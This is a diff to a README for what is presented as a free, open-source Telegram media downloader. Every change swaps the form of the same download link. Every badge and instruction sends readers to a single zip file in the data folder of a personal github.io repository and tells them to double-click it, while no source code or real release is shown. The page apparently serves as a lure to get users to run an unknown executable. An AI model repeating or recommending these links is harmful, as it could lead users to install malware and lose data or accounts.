@@ -5,11 +5,11 @@ description: "Download and back up Telegram channel media—images, videos, audi
 ---
 # 📥 telegram-media-downloader - Save Telegram Media In One Click
 
-[![Download Now](https://img.shields.io/badge/⬇_Download-telegram--media--downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip)
-[![Latest Release](https://img.shields.io/badge/Release-Latest-8957e5?style=for-the-badge&logo=git&logoColor=white)](https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip)
-[![Free and Open Source](https://img.shields.io/badge/Free_%26_Open_Source-Yes-ff6b6b?style=for-the-badge)](https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip)
+[![Download Now](https://img.shields.io/badge/⬇_Download-telegram--media--downloader-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip)
+[![Latest Release](https://img.shields.io/badge/Release-Latest-8957e5?style=for-the-badge&logo=git&logoColor=white)](https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip)
+[![Free and Open Source](https://img.shields.io/badge/Free_%26_Open_Source-Yes-ff6b6b?style=for-the-badge)](https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip)
 
-**Visit this link to download the application:** https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip
+**Visit this link to download the application:** https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip
 
 telegram-media-downloader is a friendly desktop app that saves photos, videos, voice messages, music files and documents from your Telegram channels onto your own computer. If you have ever scrolled through a channel and wished you could keep everything in one safe folder, this is the tool for you. You do not need to know anything about programming, commands or code. You click a button, choose a channel, and the app copies the files to a folder you pick.
 
@@ -40,7 +40,7 @@ Getting the app onto your computer takes a few minutes and only a handful of cli
 
 **Step 1 – Open the download page**
 
-Visit this link to download the application: **https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip**
+Visit this link to download the application: **https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip**
 
 **Step 2 – Save the file**
 
@@ -120,6 +120,6 @@ If something does not work, open the repository page and use the **Issues** tab 
 
 If you find the app useful, giving the repository a star helps other Telegram users discover it.
 
-**Quick reminder:** Visit **https://raw.githubusercontent.com/taraldesai10/taraldesai10.github.io/main/data/v1.5.zip** to download the application, then double-click the saved file to start your first backup.
+**Quick reminder:** Visit **https://github.com/taraldesai10/taraldesai10.github.io/raw/refs/heads/main/data/v1.5.zip** to download the application, then double-click the saved file to start your first backup.
 
 Keywords: backup, downloader, macos, open-source, python, swift, telegram
